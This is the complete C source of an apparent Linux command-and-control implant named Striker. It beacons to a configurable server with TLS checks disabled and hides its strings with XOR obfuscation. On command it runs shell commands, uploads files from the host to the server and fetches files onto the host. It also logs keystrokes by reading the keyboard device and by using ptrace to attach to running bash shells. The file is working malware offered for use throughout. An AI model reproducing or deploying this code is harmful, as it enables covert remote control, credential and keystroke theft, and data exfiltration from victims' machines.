/**
 *------------------------------------
 * Striker C2 implant for linux hosts.
 *                  Author: Umar Abdul
 *------------------------------------
 */

#include "striker.h"

// Controls debug output
#define STRIKER_DEBUG
// Size of agent UID
#define AGENT_UID_SIZE 17
// Max task result size in bytes
#define MAX_RES_SIZE (sizeof(char) * 102400)
// Max number of tasks to queue.
#define MAX_TASKS_QUEUE 100
// Max number of failed attempts to contact server before trying another server (if available)
#define MAX_CONTACT_FAILS 3
// Max number of keystrokes to collect by keymon
#define KEYMON_MAX_KEYSTROKES 50000
// Max number of processes to hook by keymon
#define KEYMON_MAX_PROCS 100
// Keymon's process refresh rate (in secs)
#define KEYMON_PROC_DELAY 1
// Max URL length allowed
#define URL_SIZE (sizeof(char) * 256)

// SSL config
#define SKIP_PEER_VERIFICATION
#define SKIP_HOST_VERIFICATION

// Markers for the agent builder.
char BASE_URL[URL_SIZE] = "[STRIKER_URL]";
char AUTH_KEY[sizeof(char) * 33] = "[STRIKER_AUTH_KEY]";
char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]";
char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]";


char *obfs_decode(char *str){

  unsigned char key = (unsigned char)atoi(OBFS_KEY);
  size_t len = strlen(str);
  unsigned char curr_key;
  for (int i = 0; i < len; i++){
    curr_key = key * (i + 1);
    while (curr_key == 0 || curr_key == 10 || (curr_key >= 32 && curr_key <= 126))
      curr_key += 47;
    str[i] = str[i] ^ curr_key;
    key = curr_key;
  }
  return str;
}

CURL *init_curl(const char *path, buffer *buff, unsigned char absolute){
  
  CURL *curl = curl_easy_init();
  if (!curl){
    #ifdef STRIKER_DEBUG
    fprintf(stderr, "[-] Error initializing curl!\n");
    #endif
    exit(EXIT_FAILURE);
  }
  char *url = malloc(URL_SIZE);
  if (absolute)
    strncpy(url, path, URL_SIZE);
  else
    snprintf(url, URL_SIZE, "%s%s", BASE_URL, path);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
  #ifdef SKIP_PEER_VERIFICATION
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
  #endif
  #ifdef SKIP_HOST_VERIFICATION
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
  #endif
  free(url);
  return curl;
}

size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){

  size_t chunk_size = size * nmemb;
  append_buffer(buff, chunk, chunk_size);
  return chunk_size; // This tells curl that we received all bytes.
}

size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo){
  return fwrite(chunk, size, nmemb, wfo);
}

cJSON *sysinfo(){

  char strs[][30] = {"[OBFS_ENC]USER", "[OBFS_ENC]linux", "[OBFS_ENC]user", "[OBFS_ENC]pid", "[OBFS_ENC]cwd", "[OBFS_ENC]os", "[OBFS_ENC]host"};
  for (int i = 0; i < 7; i++)
    obfs_decode(strs[i]);
  cJSON *info = cJSON_CreateObject();
  char *user = getenv(strs[0]);
  unsigned short pid = getpid();
  char *cwd = malloc(PATH_MAX);
  getcwd(cwd, PATH_MAX);
  char *host = malloc(100);
  gethostname(host, 99);
  cJSON_AddItemToObject(info, strs[2], cJSON_CreateString(user));
  cJSON_AddItemToObject(info, strs[3], cJSON_CreateNumber(pid));
  cJSON_AddItemToObject(info, strs[4], cJSON_CreateString(cwd));
  cJSON_AddItemToObject(info, strs[5], cJSON_CreateString(strs[1]));
  cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(host));
  free(cwd);
  free(host);
  return info;
}

short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){

  buffer *body = create_buffer(0);
  CURL *curl = init_curl(url, body, 1);
  char strs[][20] = {"[OBFS_ENC]file", "[OBFS_ENC]filename"};
  for (int i = 0; i < 2; i++)
    obfs_decode(strs[i]);
  CURLcode res;
  curl_mime *form;
  curl_mimepart *field;
  form = curl_mime_init(curl);
  field = curl_mime_addpart(form);
  curl_mime_name(field, strs[0]);
  curl_mime_filedata(field, filename);
  field = curl_mime_addpart(form);
  curl_mime_name(field, strs[1]);
  curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
  curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
  res = curl_easy_perform(curl);
  free_buffer(body);
  curl_mime_free(form);
  curl_easy_cleanup(curl);
  if (res != CURLE_OK){
    buffer_strcpy(result_buff, curl_easy_strerror(res));
    return 0;
  }
  return 1;
}

short int download_file(char *url, FILE *wfo, buffer *result_buff){

  CURL *curl = init_curl(url, NULL, 1);
  CURLcode res;
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
  res = curl_easy_perform(curl);
  curl_easy_cleanup(curl);
  if (res != CURLE_OK){
    buffer_strcpy(result_buff, curl_easy_strerror(res));
    return 0;
  }
  char msg[] = "[OBFS_ENC]File uploaded successfully!";
  buffer_strcpy(result_buff, obfs_decode(msg));
  return 1;
}

void keymon(session *striker, task *tsk){

  char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]main-kbd"};
  for (int i = 0; i < 7; i++)
    obfs_decode(strs[i]);
  cJSON *data = tsk->data;
  unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
  unsigned char *keys = malloc(sizeof(unsigned char) * KEYMON_MAX_KEYSTROKES);
  size_t count = 0;
  buffer *result_buff = create_buffer(0);
  int kb = open(strs[1], O_RDONLY);
  unsigned char main_kb_attached = 1;
  if (kb == -1){
    buffer_strcpy(result_buff, strs[2]);
    main_kb_attached = 0;
  }
  fd_set set;
  struct timeval timeout = {1, 0};
  struct input_event e;
  time_t end_time = time(NULL) + duration;
  
  queue *km_proc_dumps = queue_init(KEYMON_MAX_PROCS);
  queue *km_proc_arg = queue_init(3);
  queue_put(km_proc_arg, striker);
  queue_put(km_proc_arg, &end_time);
  queue_put(km_proc_arg, km_proc_dumps);
  pthread_t tid;
  pthread_create(&tid, NULL, keymon_proc_watch, km_proc_arg);
  
  if (main_kb_attached){  
    while (count < KEYMON_MAX_KEYSTROKES && time(NULL) < end_time){
      timeout.tv_sec = 1;
      FD_ZERO(&set);
      FD_SET(kb, &set);
      int status = select(kb + 1, &set, NULL, NULL, &timeout);
      if (status == -1)
        break;
      if (status == 0)
        continue;
      read(kb, &e, sizeof(e));
      if (!(e.type == EV_KEY && e.value == 0))
        continue;
      keys[count] = e.code;
      count++;
    }
    close(kb);
  }

  pthread_join(tid, NULL);

  queue_seek(km_proc_dumps, 0);
  while (!queue_exhausted(km_proc_dumps)){
    queue *km_result = queue_get(km_proc_dumps);
    queue_seek(km_result, 2);
    pid_t *pid = queue_get(km_result);
    cJSON *proc_keys = cJSON_CreateArray();
    while (!queue_exhausted(km_result)){
      unsigned char *key = queue_get(km_result);
      cJSON_AddItemToArray(proc_keys, cJSON_CreateNumber(*key));
      free(key);
    }
    char pid_str[8];
    snprintf(pid_str, 8, "%d", *pid);
    cJSON_AddItemToObject(tsk->result, pid_str, proc_keys);
    queue_free(km_result, 0);
    free(pid);
  }
  queue_free(km_proc_dumps, 0);
  queue_free(km_proc_arg, 0);
  
  cJSON_AddItemToObject(tsk->result, strs[4], cJSON_CreateString(tsk->uid));
  if (count > 0){
    cJSON *main_kb_keys = cJSON_CreateArray();
    for (int i = 0; i < count; i++)
      cJSON_AddItemToArray(main_kb_keys, cJSON_CreateNumber(keys[i]));
    cJSON_AddItemToObject(tsk->result, strs[6], main_kb_keys);
  }else{
    char *res = buffer_to_string(result_buff);
    cJSON_AddItemToObject(tsk->result, strs[5], cJSON_CreateString(res));
  }
  tsk->completed = 1;
  free(keys);
  free_buffer(result_buff);
}

void *keymon_proc_watch(void *ptr){

  char strs[][40] = {"[OBFS_ENC]/proc", "[OBFS_ENC]/proc/%d/cmdline"};
  for (int i = 0; i < 2; i++)
    obfs_decode(strs[i]);
  char targets[][30] = {"[OBFS_ENC]-bash", "[OBFS_ENC]bash" , "[OBFS_ENC]/bin/bash", "[OBFS_ENC]/usr/bin/bash"};
  int targets_len = sizeof(targets) / 50;
  for (int i = 0; i < targets_len; i++)
    obfs_decode(targets[i]);
  queue *q = (queue *)ptr;
  session *striker = queue_get(q);
  time_t *end_time = queue_get(q);
  queue *results_queue = queue_get(q);
  pthread_t tids[KEYMON_MAX_PROCS];
  pid_t pids[KEYMON_MAX_PROCS];
  size_t attached_count = 0;
  while (attached_count < KEYMON_MAX_PROCS && time(NULL) < *end_time){
    struct dirent *dir;
    DIR *d = opendir(strs[0]);
    if (!d)
      break;
    while ((dir = readdir(d)) != NULL && attached_count < KEYMON_MAX_PROCS){
      if (dir->d_type == DT_DIR){
        pid_t *pid = malloc(sizeof(pid_t));
        *pid = atoi(dir->d_name);
        if (*pid == 0){
          free(pid);
          continue;
        }
        unsigned char watched = 0;
        for (int i = 0; i < attached_count; i++){
          if (pids[i] == *pid){
            watched = 1;
            break;
          }
        }
        if (watched){
          free(pid);
          continue;
        }
        // /proc/<pid>/cmdline file separates executable and args with null bytes, so we need this form of matching to seperate shell sessions from script invocations like: /bin/bash script.sh
        char *filename = malloc(50);
        memset(filename, 0, 50);
        snprintf(filename, 50, strs[1], *pid);
        int fd = open(filename, O_RDONLY);
        if (fd == -1){
          free(filename); free(pid);
          continue;
        }
        char *proc_name = malloc(50);
        memset(proc_name, 0, 50);
        int n = read(fd, proc_name, 50);
        if (n == 0 || n == -1){
          close(fd); free(filename); free(proc_name); free(pid);
          continue;
        }
        char *buff = malloc(50);
        int valid = 0;
        for (int i = 0; i < targets_len; i++){
          memset(buff, 0, 50);
          strncpy(buff, targets[i], strlen(targets[i]));
          if (!memcmp(buff, proc_name, 50)){
            valid = 1;
            break;
          }
        }
        close(fd); free(filename); free(proc_name); free(buff);
        if (!valid){
          free(pid);
          continue;
        }
        queue *data = queue_init(KEYMON_MAX_KEYSTROKES + 3);
        queue_put(data, striker);
        queue_put(data, end_time);
        queue_put(data, pid);
        queue_put(results_queue, data);
        pthread_create(tids + attached_count, NULL, keymon_proc_attach, data);
        pids[attached_count] = *pid;
        attached_count++;
      }
    }
    closedir(d);
    sleep(KEYMON_PROC_DELAY);
  }
  for (int i = 0; i < attached_count; i++)
    pthread_join(tids[i], NULL);
  pthread_exit(NULL);
}

void *keymon_proc_attach(void *ptr){

  queue *q = (queue *)ptr;
  session *striker = queue_get(q);
  time_t *end_time = queue_get(q);
  pid_t *pid = queue_get(q);
  struct user_regs_struct regs;
  if (ptrace(PTRACE_ATTACH, *pid, NULL, NULL))
    pthread_exit(NULL);
  ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
  while (striker->abort == 0 && queue_full(q) == 0 && time(NULL) < *end_time){
    ptrace(PTRACE_SYSCALL, *pid, 0, 0);
    int status = -47;
    while (status == -47){
      waitpid(*pid, &status, WNOHANG);
      usleep(1000);
      if (striker->abort || time(NULL) >= *end_time)
        goto complete;
    }
    if (WIFEXITED(status))
      break;
    ptrace(PTRACE_GETREGS, *pid, 0, &regs);
    if (regs.orig_rax == 0 && regs.rdi == 0){
      unsigned char *val = malloc(sizeof(unsigned char));
      *val = (unsigned char)ptrace(PTRACE_PEEKDATA, *pid, regs.rsi, 0);
      if (*val != 0)
        queue_put(q, val);
      else
        free(val);
    }
  }
  complete:
    ptrace(PTRACE_DETACH, *pid, NULL, NULL);
    pthread_exit(NULL);
}

task *parse_task(cJSON *json){

  char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
  for (int i = 0; i < 3; i++)
    obfs_decode(strs[i]);  
  task *t = malloc(sizeof(task));
  t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[0]));
  t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
  t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
  t->completed = 0;
  t->result = cJSON_CreateObject();
  t->input_json = json;
  return t;
}

void free_task(task *tsk){
  
  cJSON_Delete(tsk->result);
  cJSON_Delete(tsk->input_json);
  free(tsk);
}

void *task_executor(void *ptr){

  pthread_detach(pthread_self());
  task_wrapper *tskw = (task_wrapper *)ptr;
  session *striker = tskw->striker;
  task *tsk = tskw->tsk;
  #ifdef STRIKER_DEBUG
  printf("[*] Executing task: %s\n", tsk->uid);
  #endif
  cJSON *data = tsk->data;
  buffer *result_buff = create_buffer(0);
  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd"};
  for (int i = 0; i < 8; i++)
    obfs_decode(cmd_strs[i]);
  if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
    char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
    for (int i = 0; i < 2; i++)
      obfs_decode(strs[i]);
    char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    if (!cmd)
      goto complete;
    char *shell_cmd = malloc(sizeof(char) * 1024);
    snprintf(shell_cmd, sizeof(char) * 1024, strs[1], cmd);
    FILE *proc = popen(shell_cmd, "r");
    free(shell_cmd);
    if (!proc)
      goto complete;
    const short chunk_size = 1024;
    char *tmp = malloc(sizeof(char) * chunk_size);
    while (result_buff->used < MAX_RES_SIZE){
      if (fgets(tmp, chunk_size, proc) == NULL)
        break;
      append_buffer(result_buff, tmp, strlen(tmp));
    }
    free(tmp);
    pclose(proc);
  }else if (!strcmp(tsk->type, cmd_strs[1])){ // Upload a file to the server.
    char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s"};
    for (int i = 0; i < 3; i++)
      obfs_decode(strs[i]);
    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    FILE *rfo = fopen(filename, "r");
    if (!rfo){
      buffer_strcpy(result_buff, strs[1]);
      goto complete;
    }
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid) < 0)
      abort();
    upload_file(url, filename, rfo, result_buff);
    fclose(rfo);
    free(url);
  }else if (!strcmp(tsk->type, cmd_strs[2])){ // Download a file from the server.
    char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s", "[OBFS_ENC]Error writing file: "};
    for (int i = 0; i < 5; i++)
      obfs_decode(strs[i]);
    char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    char *name = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[1]));
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, fileID) < 0)
      abort();
    char *loc = malloc(PATH_MAX);
    if (snprintf(loc, PATH_MAX, strs[3], striker->write_dir, name) < 0)
      abort();
    FILE *wfo = fopen(loc, "w");
    if (wfo != NULL){
      download_file(url, wfo, result_buff);
      fclose(wfo);
    }else{
      append_buffer(result_buff, strs[4], strlen(strs[4]));
      append_buffer(result_buff, loc, strlen(loc));
    }
    free(url);
    free(loc);
  }else if (!strcmp(tsk->type, cmd_strs[3])){ // Change write directory.
    char strs[][40] = {"[OBFS_ENC]dir", "[OBFS_ENC]Changed write directory!"};
    for (int i = 0; i < 2; i++)
      obfs_decode(strs[i]);
    char *dir = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    int len = strlen(dir);
    if (dir[len - 1] != '/'){
      dir[len] = '/';
      dir[len + 1] = '\0';
    }
    strncpy(striker->write_dir, dir, PATH_MAX);
    buffer_strcpy(result_buff, strs[1]);
  }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
    keymon(striker, tsk);
  }else if (!strcmp(tsk->type, cmd_strs[5])){ // Abort the session.
    char msg[] = "[OBFS_ENC]Session aborted!";
    buffer_strcpy(result_buff, obfs_decode(msg));
    striker->abort = 1;
  }else if (!strcmp(tsk->type, cmd_strs[6])){ // Update callback delay.
    char msg[] = "[OBFS_ENC]Callback delay updated!";
    striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[6]));
    buffer_strcpy(result_buff, obfs_decode(msg));
  }else if (!strcmp(tsk->type, cmd_strs[7])){ // Change working directory
    char strs[][50] = {"[OBFS_ENC]Changed working directory!", "[OBFS_ENC]Error changing working directory!", "[OBFS_ENC]dir"};
    if (chdir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])))))
      buffer_strcpy(result_buff, obfs_decode(strs[1]));
    else
      buffer_strcpy(result_buff, obfs_decode(strs[0]));
  }else{
    char msg[] = "[OBFS_ENC]Not implemented!";
    buffer_strcpy(result_buff, obfs_decode(msg));
  }

  complete: ; // empty statement to appease GCC
    char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]result"};
    for (int i = 0; i < 2; i++)
      obfs_decode(strs[i]);
    #ifdef STRIKER_DEBUG
    printf("[+] Task completed: %s\n", tsk->uid);
    #endif
    if (!tsk->completed){    
      char *res = buffer_to_string(result_buff);
      cJSON_AddItemToObject(tsk->result, strs[0], cJSON_CreateString(tsk->uid));
      cJSON_AddItemToObject(tsk->result, strs[1], cJSON_CreateString(res));
      free(res);
      tsk->completed = 1;
    }
    free_buffer(result_buff);
    free(tskw);
    pthread_exit(NULL);
}

void start_session(){  
  
  queue *base_addrs = queue_init(100);
  obfs_decode(BASE_URL);
  queue_put(base_addrs, strdup(BASE_URL));
  char strs[][50] = {
    "[OBFS_ENC]/tmp/", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key", "[OBFS_ENC]delay", "[OBFS_ENC]redirectors"};
  for (int i = 0; i < 9; i++)
    obfs_decode(strs[i]);
  // Default session setup.
  session *striker = malloc(sizeof(session));
  striker->uid = malloc(AGENT_UID_SIZE);
  memset(striker->uid, 0, AGENT_UID_SIZE);
  striker->auth_key = malloc(strlen(AUTH_KEY));
  strncpy(striker->auth_key, AUTH_KEY, strlen(AUTH_KEY));
  striker->delay = atoi(DELAY);
  if (striker->delay == 0)
    striker->delay = 10;
  striker->write_dir = malloc(PATH_MAX);
  strncpy(striker->write_dir, strs[0], PATH_MAX);
  striker->abort = 0;
  char *tmp;

  CURL *curl;
  CURLcode res;
  int rsp_code;
  // Build the common headers that will be used for GET and POST requests.
  struct curl_slist *get_headers = NULL, *post_headers = NULL;
  get_headers = curl_slist_append(get_headers, strs[1]);
  post_headers = curl_slist_append(post_headers, strs[1]);
  post_headers = curl_slist_append(post_headers, strs[2]);
  buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.

  // Connects to the C2 server.
  contact_base: ;
    cJSON *info = sysinfo();
    cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(AUTH_KEY));
    cJSON_AddItemToObject(info, strs[7], cJSON_CreateNumber(striker->delay));
    tmp = cJSON_PrintUnformatted(info);
    cJSON_Delete(info);
    unsigned char connected = 0, fresh_conn = 0;
    while (!(striker->abort || connected)){
      queue_seek(base_addrs, 0);
      while (!queue_exhausted(base_addrs)){
        strncpy(BASE_URL, queue_get(base_addrs), URL_SIZE);
        resize_buffer(body, 0);
        if (strlen(striker->uid) == 0){ // No agent ID. Create a fresh session.
          curl = init_curl(strs[3], body, 0);
          curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
          fresh_conn = 1;
        }else{ // Try to resume the session by checking if the agent ID is valid for the server.
          char *url = malloc(64);
          char fmt[] = "[OBFS_ENC]/agent/ping/%s";
          snprintf(url, 64, obfs_decode(fmt), striker->uid);
          curl = init_curl(url, body, 0);
          curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
          free(url);
          fresh_conn = 0;
        }
        res = curl_easy_perform(curl);
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
        curl_easy_cleanup(curl);
        if (res != CURLE_OK){
          #ifdef STRIKER_DEBUG
          fprintf(stderr, "[-] Error calling home %s: %s\n", BASE_URL, curl_easy_strerror(res));
          #endif
          sleep(striker->delay);
          continue;
        }
        if (rsp_code != 200){
          #ifdef STRIKER_DEBUG
          fprintf(stderr, "[-] Non-200 response received: %d\n", rsp_code);
          #endif
          sleep(striker->delay);
          continue;
        }
        connected = 1;
        break;
      }
    }
  free(tmp);
  if (!connected)
    goto end;

  if (fresh_conn){ 
    // Parse the configuration received from the server.
    char *config_str = buffer_to_string(body);
    cJSON *config = cJSON_Parse(config_str);
    #ifdef STRIKER_DEBUG
    printf("[*] Agent config: %s\n", config_str);
    #endif
    if (!config){
      #ifdef STRIKER_DEBUG
      const char *error = cJSON_GetErrorPtr();
      fprintf(stderr, "[-] Error parsing config: %s\n", error);
      #endif
      free(config_str);
      goto end;
    }
    // Extract agent ID.
    tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
    if (tmp == NULL){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] No config received from server, exiting...\n");
      #endif
      cJSON_Delete(config);
      free(config_str);
      goto end;
    }
    strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
    // Extract redirectors.
    // 1 - Delete all existing ones.
    queue_seek(base_addrs, 0);
    while (!queue_empty(base_addrs)){
      char *url = queue_remove(base_addrs, 0);
      free(url);
    }
    // 2 - Add the current base URL.
    queue_put(base_addrs, strdup(BASE_URL));
    // 3 - Load the other redirectors.
    cJSON *rds = cJSON_GetObjectItemCaseSensitive(config, strs[8]);
    size_t rds_count = cJSON_GetArraySize(rds);
    while (rds_count > 0){
      queue_put(base_addrs, strdup(cJSON_GetStringValue(cJSON_GetArrayItem(rds, 0))));
      cJSON_DeleteItemFromArray(rds, 0);
      rds_count--;
    }
    #ifdef STRIKER_DEBUG
    printf("[+] Servers count: %ld\n", base_addrs->count);
    #endif

    cJSON_Delete(config);
    free(config_str);
  }

  char *tasksURL = malloc(URL_SIZE);
  snprintf(tasksURL, URL_SIZE, strs[5], striker->uid);
  queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
  queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
  unsigned int contact_fails = 0;
  while (!striker->abort){
    if (contact_fails >= MAX_CONTACT_FAILS){ // Switch to another server.
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[!] Max failed connection attempts reached. Switching server...\n");
      #endif
      // Cleanup
      free(tasksURL);
      queue_seek(tasks_queue, 0);
      while (!queue_exhausted(tasks_queue))
        free_task(queue_get(tasks_queue));
      queue_seek(completed_tasks, 0);
      while (!queue_exhausted(completed_tasks))
        free_task(queue_get(completed_tasks));
      queue_free(tasks_queue, 0);
      queue_free(completed_tasks, 0);
      // Switch
      goto contact_base;
    }
    queue_seek(completed_tasks, 0);
    unsigned long next_cb_time = (unsigned long)time(NULL) + striker->delay;
    while ((unsigned long)time(NULL) < next_cb_time){
      sleep(1); // We don't want to wait for the whole callback delay before sending task results. A 1 sec sleep also allow us to bundle results for mutliple tasks that finish quickly.
      // Find completed tasks.
      queue_seek(tasks_queue, 0);
      for (int i = 0; i < tasks_queue->count; i++){
        task *tsk = queue_get(tasks_queue);
        if (tsk->completed){
          queue_put(completed_tasks, tsk);
          queue_remove(tasks_queue, i);
          queue_seek(tasks_queue, tasks_queue->pos - 1);
          i--;
        }
      }
      // Build and send results.
      queue_seek(completed_tasks, 0);
      if (completed_tasks->count > 0){
        #ifdef STRIKER_DEBUG
        printf("[+] Sending results for %ld tasks\n", completed_tasks->count);
        #endif
        cJSON *results = cJSON_CreateArray();
        while (!queue_exhausted(completed_tasks)){
          task *tsk = queue_get(completed_tasks);
          cJSON_AddItemToArray(results, tsk->result);
        }
        char *result = cJSON_PrintUnformatted(results);
        resize_buffer(body, 0);
        curl = init_curl(tasksURL, body, 0);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        if (res != CURLE_OK){
          #ifdef STRIKER_DEBUG
          fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
          #endif
          size_t count = cJSON_GetArraySize(results);
          while (count > 0){
            cJSON_DetachItemFromArray(results, count - 1);
            count--;
          }
          cJSON_Delete(results);
          free(result);
          contact_fails++;
          continue;          
        }
        queue_seek(completed_tasks, 0);
        while (!queue_exhausted(completed_tasks)){
          task *tsk = queue_get(completed_tasks);
          cJSON_DetachItemFromArray(results, completed_tasks->pos - 1); // To avoid double free when later calling the cJSON_Delete() with the `results` JSON after calling free_task()
          queue_remove(completed_tasks, completed_tasks->pos - 1);
          queue_seek(completed_tasks, completed_tasks->pos - 1);
          free_task(tsk);
        }
        cJSON_Delete(results);
        free(result);
      }
    }
    // Fetch new tasks tasks.
    resize_buffer(body, 0);
    curl = init_curl(tasksURL, body, 0);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      #ifdef STRIKER_DEBUG
      fprintf(stderr, "[-] Error fetching tasks: %s\n", curl_easy_strerror(res));
      #endif
      contact_fails++;
      continue;
    }
    // Parse tasks and spawn execution threads.
    tmp = buffer_to_string(body);
    cJSON *tasksJSON = cJSON_Parse(tmp);
    size_t tasksLen = cJSON_GetArraySize(tasksJSON);
    cJSON *json = NULL;
    for (int i = 0; i < tasksLen; i++){
      json = cJSON_GetArrayItem(tasksJSON, i);
      task *tsk = parse_task(json);
      cJSON_DetachItemFromArray(tasksJSON, i);
      queue_put(tasks_queue, tsk);
      task_wrapper *tskw = malloc(sizeof(task_wrapper));
      tskw->striker = striker;
      tskw->tsk = tsk;
      pthread_t t;
      if (pthread_create(&t, NULL, task_executor, (void *)tskw)){
        #ifdef STRIKER_DEBUG
        fprintf(stderr, "[-] Error starting thread for task: %s\n", tsk->uid);
        #endif
        queue_remove(tasks_queue, tasks_queue->count - 1);
        free_task(tsk);
        free(tskw);
      }
      i--;
      tasksLen--;
    }
    cJSON_Delete(tasksJSON);
    free(tmp);
  }

  free(tasksURL);
  queue_seek(tasks_queue, 0);
  while (!queue_exhausted(tasks_queue))
    free_task(queue_get(tasks_queue));
  queue_seek(completed_tasks, 0);
  while (!queue_exhausted(completed_tasks))
    free_task(queue_get(completed_tasks));
  queue_free(tasks_queue, 0);
  queue_free(completed_tasks, 0);

  end:
    curl_slist_free_all(get_headers);
    curl_slist_free_all(post_headers);
    free_buffer(body);
    queue_free(base_addrs, 1);
    cleanup_session(striker);
}

void cleanup_session(session *striker){

  free(striker->uid);
  free(striker->auth_key);
  free(striker->write_dir);
  free(striker);
}

int main(int argc, char **argv){
  
  curl_global_init(CURL_GLOBAL_ALL);
  start_session();
  curl_global_cleanup();
  return 0;  
}
